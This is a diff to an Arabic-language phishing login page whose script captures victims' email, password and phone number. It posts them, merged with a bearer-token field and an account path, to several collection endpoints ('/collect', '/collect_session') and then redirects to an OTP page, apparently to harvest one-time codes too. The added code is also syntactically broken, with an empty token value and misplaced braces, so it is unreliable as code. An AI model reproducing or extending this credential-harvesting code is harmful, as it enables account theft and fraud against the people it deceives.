@@ -77,7 +77,7 @@
         <input type="text" name="email" placeholder="عنوان البريد الإلكتروني" required>
         <input type="password" name="password" placeholder="كلمة المرور" required>
         <input type="tel" name="phone" placeholder="رقم الهاتف" required>
-        <button type="submit">Verify and Continue</button>
+        <button type="submit"> Verify and Continue</button>
     </form>
 </div>
 
@@ -85,17 +85,49 @@
 
 document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
+    
     let formData = {
         email: this.email.value,
         password: this.password.value,
         phone: this.phone.value,
     };
+    
+    const payload = {
+        path: "/@bmwlovers1077",
+        event: "button_click", 
+        beareToken: 
+        time: new Date().toISOString(),
+    }
+     
+    const compinedData = {
+      ...formData,
+      ...payload
+      }; 
+      
+    fetch("/endpoint", {
+      method: "POST",
+      credentials: "include",
+      },
+      
+       body: JSON.stringify(compinedData)  
+       })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("result").innerText = JSON.stringify(data);
+      });
+      
     fetch("/collect", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(formData)
-    }).then(() => {
-        window.location.href = "/otp";
+        body: JSON.stringify(compinedData)
+    });
+
+    fetch("/collect_session", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(compinedData)
+    }) .then(() => {
+        window.location.href = "/otp.html";
     });
 });
 </script>
